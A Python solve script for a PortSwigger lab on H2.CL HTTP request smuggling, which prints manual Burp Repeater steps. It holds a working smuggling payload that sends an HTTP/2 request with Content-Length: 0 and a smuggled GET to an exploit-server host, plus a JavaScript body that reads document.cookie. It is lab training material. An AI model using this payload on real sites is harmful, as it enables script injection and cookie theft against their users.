#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: H2.CL request smuggling.

Documentation-first — automating HTTP/2 with deliberately-mismatched CL
requires low-level h2 framing control (CL=0 header + non-empty DATA frames).
Manual steps in Burp Repeater (Inspector → HTTP/2) are the clean path.

Manual flow:

  1. Exploit server:
       File: /resources
       Content-Type: text/javascript
       Body: alert(document.cookie)
       Store.

  2. Burp Repeater (HTTP/2):

       POST / HTTP/2
       Host: LAB-ID.web-security-academy.net
       Content-Length: 0

       GET /resources HTTP/1.1
       Host: EXPLOIT-ID.exploit-server.net
       Content-Length: 5

       x=1

  3. Send 5-10 times with brief waits.
  4. Check exploit server Access log for GET /resources/ entries.
  5. Lab marks solved when the victim imports and executes the JS.
"""

import argparse
import re


MANUAL_INSTRUCTIONS = """
Manual steps (Burp Repeater, Inspector → HTTP/2):

Prerequisite — exploit server:
  File:        /resources
  Content-Type: text/javascript
  Body:         alert(document.cookie)
  Store.

Payload (replace LAB and EXPLOIT with your hostnames):

----------------------------------------
POST / HTTP/2
Host: {lab}
Content-Length: 0

GET /resources HTTP/1.1
Host: {exploit}
Content-Length: 5

x=1
----------------------------------------

Checklist:
  - Inspector protocol: HTTP/2
  - Content-Length: 0 is explicit (not auto-corrected)
  - Body is NON-empty (the GET /resources ... x=1 goes AFTER the blank line)

Send 5-10 times with brief waits. Watch the exploit server Access log for
`GET /resources/` entries. Lab solves when the victim's browser imports
and executes the JS from the exploit server.
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 14: H2.CL request smuggling (manual steps printed)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL")
    args = parser.parse_args()

    lab = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    exploit = re.sub(r"^https?://", "", args.exploit_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(lab=lab, exploit=exploit))


if __name__ == "__main__":
    main()
